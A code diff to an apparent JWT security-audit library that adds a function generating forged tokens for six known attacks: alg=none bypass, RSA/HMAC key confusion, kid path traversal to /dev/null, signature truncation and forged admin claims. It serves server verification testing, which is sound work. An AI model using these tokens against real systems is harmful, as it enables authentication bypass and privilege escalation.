@@ -18,10 +18,12 @@ import re
 import time
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
-from .crypto_engine import calculate_token_entropy, crack_hmac_secret
+from .base64_url import base64url_encode_json
+from .crypto_engine import calculate_token_entropy, crack_hmac_secret, sign_hmac
 from .models import (
     DecodedJWT,
     JWTAlgorithm,
+    JWTExploitPayload,
     SecurityAuditReport,
     SecuritySeverity,
     SecurityVulnerability,
@@ -2416,3 +2418,141 @@ def audit_jwt(
         weak_secret_detected=weak_secret_found,
         detected_secret=cracked_secret,
     )
+
+
+def generate_exploit_tokens(
+    token: Union[str, DecodedJWT],
+    forged_claims: Optional[Dict[str, Any]] = None,
+    public_key_pem: Optional[str] = None,
+) -> List[JWTExploitPayload]:
+    """Generate fuzzed exploit variations of a JWT to test downstream server verification.
+
+    Produces simulated exploit tokens for:
+    1. Algorithm "none" bypass (CVE-2015-9235) with signature stripped.
+    2. Algorithm "none" bypass with signature retained.
+    3. Algorithm confusion attack (CVE-2016-5431) using RSA public key as HMAC secret.
+    4. Kid path traversal attack (/dev/null / null key injection).
+    5. Signature truncation / null byte injection.
+    6. Forged claims privilege escalation (tampered payload without valid signature).
+
+    Args:
+        token: Legitimate template JWT or DecodedJWT.
+        forged_claims: Custom payload claims to inject (e.g. {"role": "admin"}).
+        public_key_pem: Optional RSA public key string for key confusion simulation.
+
+    Returns:
+        List[JWTExploitPayload]: Suite of testing payloads.
+    """
+    decoded = token if isinstance(token, DecodedJWT) else parse_jwt(token)
+    header = dict(decoded.header) if decoded.header else {"alg": "HS256", "typ": "JWT"}
+    payload = dict(decoded.payload) if decoded.payload else {}
+
+    if forged_claims:
+        payload.update(forged_claims)
+
+    payload_b64 = base64url_encode_json(payload)
+    results: List[JWTExploitPayload] = []
+
+    # 1. Algorithm "none" with signature stripped (classic CVE-2015-9235)
+    none_header = dict(header)
+    none_header["alg"] = "none"
+    none_header_b64 = base64url_encode_json(none_header)
+    token_none_stripped = f"{none_header_b64}.{payload_b64}."
+    results.append(
+        JWTExploitPayload(
+            attack_type="none_alg_stripped",
+            title="Algorithm 'none' with Stripped Signature",
+            description="Header alg changed to 'none' and trailing signature stripped.",
+            mutated_token=token_none_stripped,
+            cve_id="CVE-2015-9235",
+            expected_vulnerability="Server accepts unauthenticated token with alg=none.",
+        )
+    )
+
+    # 2. Algorithm "None" with retained signature
+    none_cap_header = dict(header)
+    none_cap_header["alg"] = "None"
+    none_cap_b64 = base64url_encode_json(none_cap_header)
+    token_none_retained = f"{none_cap_b64}.{payload_b64}.{decoded.signature_b64 or 'dGVzdA'}"
+    results.append(
+        JWTExploitPayload(
+            attack_type="none_alg_retained",
+            title="Algorithm 'None' with Retained Signature",
+            description="Header alg changed to case-variant 'None' while keeping original signature bytes.",
+            mutated_token=token_none_retained,
+            cve_id="CVE-2015-9235",
+            expected_vulnerability="Case-sensitive parser bypass accepting unverified None token.",
+        )
+    )
+
+    # 3. Key confusion attack (CVE-2016-5431)
+    if public_key_pem:
+        confuse_header = dict(header)
+        confuse_header["alg"] = "HS256"
+        confuse_h_b64 = base64url_encode_json(confuse_header)
+        hmac_sig = sign_hmac(confuse_h_b64, payload_b64, secret=public_key_pem.strip().encode("utf-8"), alg=JWTAlgorithm.HS256)
+        token_key_confusion = f"{confuse_h_b64}.{payload_b64}.{hmac_sig}"
+        results.append(
+            JWTExploitPayload(
+                attack_type="key_confusion_hmac",
+                title="Public Key / HMAC Key Confusion Attack",
+                description="Token signed with HS256 using public RSA key PEM string as the HMAC secret.",
+                mutated_token=token_key_confusion,
+                cve_id="CVE-2016-5431",
+                expected_vulnerability="Server verifies RSA-intended token using public key as symmetric HMAC secret.",
+            )
+        )
+
+    # 4. Kid path traversal injection (/dev/null)
+    kid_header = dict(header)
+    kid_header["alg"] = "HS256"
+    kid_header["kid"] = "../../../../../../../dev/null"
+    kid_h_b64 = base64url_encode_json(kid_header)
+    # Signing with empty byte secret as /dev/null yields 0 bytes
+    empty_sig = sign_hmac(kid_h_b64, payload_b64, secret=b"", alg=JWTAlgorithm.HS256)
+    token_kid_traversal = f"{kid_h_b64}.{payload_b64}.{empty_sig}"
+    results.append(
+        JWTExploitPayload(
+            attack_type="kid_path_traversal",
+            title="'kid' Header Path Traversal (/dev/null Injection)",
+            description="Sets kid to /dev/null and signs payload with an empty HMAC secret.",
+            mutated_token=token_kid_traversal,
+            cve_id="CVE-2018-0114",
+            expected_vulnerability="Server reads /dev/null as verification key and accepts empty secret signature.",
+        )
+    )
+
+    # 5. Null byte signature injection
+    sig_part = decoded.signature_b64 or "sig"
+    truncated_sig = sig_part[:4] if len(sig_part) > 4 else sig_part
+    token_sig_trunc = f"{decoded.header_b64}.{payload_b64}.{truncated_sig}"
+    results.append(
+        JWTExploitPayload(
+            attack_type="signature_truncation",
+            title="Signature Truncation Attack",
+            description="Truncates cryptographic signature to test if server validates full signature length.",
+            mutated_token=token_sig_trunc,
+            cve_id=None,
+            expected_vulnerability="Server performs prefix-only or length-ignorant signature comparison.",
+        )
+    )
+
+    # 6. Forged claims privilege escalation
+    admin_payload = dict(payload)
+    admin_payload["admin"] = True
+    admin_payload["role"] = "administrator"
+    admin_b64 = base64url_encode_json(admin_payload)
+    token_forged_claims = f"{decoded.header_b64}.{admin_b64}.{decoded.signature_b64 or ''}"
+    results.append(
+        JWTExploitPayload(
+            attack_type="forged_claims_tamper",
+            title="Tampered Payload Privilege Escalation",
+            description="Payload injected with role=administrator and admin=true with invalid/reused signature.",
+            mutated_token=token_forged_claims,
+            cve_id=None,
+            expected_vulnerability="Server decodes payload claims without validating cryptographic signature.",
+        )
+    )
+
+    return results
+
